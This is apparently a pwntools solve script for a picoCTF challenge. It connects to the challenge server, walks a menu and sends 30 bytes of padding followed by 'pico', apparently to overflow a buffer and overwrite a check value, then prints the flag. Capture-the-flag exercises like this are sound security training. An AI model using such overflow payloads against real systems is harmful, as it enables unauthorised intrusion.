from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
#io = elf.process()
io = remote("tethys.picoctf.net", 50049)
#context.log_level = "debug"

io.sendlineafter(b": ", b"5")
io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", b"32")
io.sendlineafter(b": ", b"A" * 30 + b'pico')
io.sendlineafter(b": ", b"4")

io.recvuntil(b"YOU WIN!!11!!\n")
flag = io.recvline().strip()
log.success(flag.decode())

io.close()
